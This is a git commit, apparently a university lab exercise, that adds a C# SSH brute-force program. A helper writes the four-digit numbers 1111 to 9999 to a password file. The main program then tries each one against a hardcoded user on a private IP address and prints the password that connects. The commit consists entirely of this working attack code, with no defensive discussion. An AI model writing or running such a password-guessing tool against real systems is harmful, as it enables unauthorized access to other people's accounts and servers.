d3e323710947933605d2f044e2199fca01f74c41
berkayersoy <berkay.ersoy.007@gmail.com>
2021-10-25 02:12:17 +0300

    Created

---
+++ Bilgi Sistemleri 3. Hafta SSH Brute Force/Helpers.cs
@@ -0,0 +1,19 @@
+﻿using System.IO;
+
+namespace Bilgi_Sistemleri_3._Hafta_SSH_Brute_Force
+{
+    public static class Helpers
+    {
+        public static void GenerateNumbers()
+        {
+            using (var sw = new StreamWriter(@"C:\Users\BERKAY\Desktop\şifreler2.txt"))
+            {
+                for (int i = 1111; i <= 9999; i++)
+                {
+                    sw.WriteLine(i);
+                }
+            }
+
+        }
+    }
+}
---
+++ Bilgi Sistemleri 3. Hafta SSH Brute Force/Program.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using Renci.SshNet;
+
+namespace Bilgi_Sistemleri_3._Hafta_SSH_Brute_Force
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+           // Helpers.GenerateNumbers();
+            var username = "mtalo";
+            var host = "10.4.0.16";
+            var path = @"C:\Users\BERKAY\Desktop\şifreler2.txt";
+            var passwords = File.ReadAllLines(path);
+            var acceptedPassword = string.Empty;
+            foreach (var password in passwords)
+            {
+                try
+                {
+                    SshClient client = new SshClient(host,username,password);
+                    client.Connect();
+                    if (client.IsConnected)
+                    {
+                        acceptedPassword = password;
+                        Console.WriteLine("Connection established with password {0}",password);
+                        break;
+                    }
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Access denied");
+                }
+            }
+        }
+    }
+}
